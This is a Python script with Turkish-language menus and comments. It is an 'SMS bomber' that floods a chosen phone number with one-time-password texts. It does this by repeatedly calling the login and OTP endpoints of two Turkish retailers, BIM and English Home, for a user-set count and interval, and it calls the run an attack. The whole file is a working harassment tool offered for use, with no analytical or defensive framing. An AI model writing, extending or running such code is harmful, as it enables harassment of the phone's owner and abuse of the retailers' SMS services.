import random
import time
import requests
import colorama
import os
from colorama import Fore

colorama.init()
os.system("clear||cls")

# SMS API Fonksiyonları--------------------------------

def sms_gonder_bim(numara):
    url = "https://bim.veesk.net:443/service/v1.0/account/login"
    payload = {"phone": numara}
    try:
        response = requests.post(url, json=payload)
        print(f"Response from Bim: {response.text}")  # Yanıtı yazdırıyoruz
        return response.status_code == 200, "BIM"
    except Exception as e:
        print(f"Error in Bim API: {e}")
        return False, f"Bim Hatası: {e}"

def sms_gonder_englishhome(numara):
    url = "https://www.englishhome.com:443/api/member/sendOtp"
    payload = {"phone": numara}
    try:
        response = requests.post(url, json=payload)
        print(f"Response from English Home: {response.text}")  # Yanıtı yazdırıyoruz
        return response.status_code == 200, "English Home"
    except Exception as e:
        print(f"Error in English Home API: {e}")
        return False, f"English Home Hatası: {e}"

# API Fonksiyonları Listesi
api_fonksiyonlari = [
    sms_gonder_bim,  # Bim API'si
    sms_gonder_englishhome    # English Home API'si
]

os.system("clear||cls")
logo = Fore.RED + '''
▗▄▄▖ ▗▄▄▄▖▗▖  ▗▖ ▗▄▄▖
▐▌ ▐▌  █  ▐▛▚▖▐▌▐▌
▐▛▀▚▖  █  ▐▌ ▝▜▌▐▌▝▜▌
▐▌ ▐▌▗▄█▄▖▐▌  ▐▌▝▚▄▞▘

▗▄▄▖ ▗▄▄▄▖▗▄▄▄ ▗▄▄▄▖▗▄▄▖
▐▌ ▐▌  █  ▐▌  █▐▌   ▐▌ ▐▌
▐▛▀▚▖  █  ▐▌  █▐▛▀▀▘▐▛▀▚▖
▐▌ ▐▌▗▄█▄▖▐▙▄▄▀▐▙▄▄▖▐▌ ▐▌
maded by ||••CAKIR/MONTANA••||
'''

# Ana Menü Fonksiyonu
def ana_menu():
    print("")
    print(" ")
    print(" ")
    print(logo)
    print(Fore.YELLOW + "1. SMS'e Başla")
    print("2. Emeği Geçenler")
    print("3. Çıkış")
    print(" ")
    print(" ")
    secim = input(Fore.CYAN + "Seçiminizi yapın (1/2/3): ")

    if secim == "1":
        os.system("cls||clear")
        sms_baslat()
    elif secim == "2":
        os.system("cls||clear")
        emegi_gecenler()
    elif secim == "3":
        os.system("clear||cls")
        print("Çıkılıyor...")
        exit()
    else:
        os.system("cls||clear")
        print("Geçersiz seçim! Tekrar deneyin.")
        time.sleep(1)
        os.system("cls||clear")
        ana_menu()

# SMS Gönderme Başlatma
def sms_baslat():
    numara = input("Telefon numaranızı girin (başında sıfır olmadan): ")
    sms_sayisi = int(input("Kaç SMS göndermek istiyorsunuz? "))
    aralik = int(input("Kaç saniye aralıklarla göndermek istersiniz? "))

    dogru_sms_sayisi = 0
    toplam_sms_gonderim = 0

    # SMS gönderimi
    while dogru_sms_sayisi < sms_sayisi:
        api_fonksiyonu = random.choice(api_fonksiyonlari)
        basari, site_adi = api_fonksiyonu(numara)

        if basari:
            print(f"{Fore.GREEN}[+]{Fore.WHITE} SMS başarıyla gönderildi! ({site_adi})")
            dogru_sms_sayisi += 1
        else:
            print(f"{Fore.RED}[-]{Fore.WHITE} SMS gönderilemedi: {site_adi}")

        toplam_sms_gonderim += 1

        if toplam_sms_gonderim < sms_sayisi:
            print(f"{aralik} saniye bekleniyor...")
            time.sleep(aralik)

    print(f"\nToplamda {dogru_sms_sayisi} doğru SMS gönderildi!")

    # Saldırı bittiğinde Enter ile ana menüye dön
    input("\nSaldırı tamamlandı! Ana menüye dönmek için Enter'a basın...")
    ana_menu()

# Emeği Geçenler
def emegi_gecenler():
    os.system("cls||clear")
    print(Fore.YELLOW + "SMS Botunu geliştirenler:")
    print("- Geliştirici: CAKIR-MONTANA")
    print("- API Sağlayıcılar: BİM, English Home...")
    print("İleriye dönük güncellemeler yapılacaktır."+ Fore.RESET)
    ana_menu()

# Başlangıç
ana_menu()
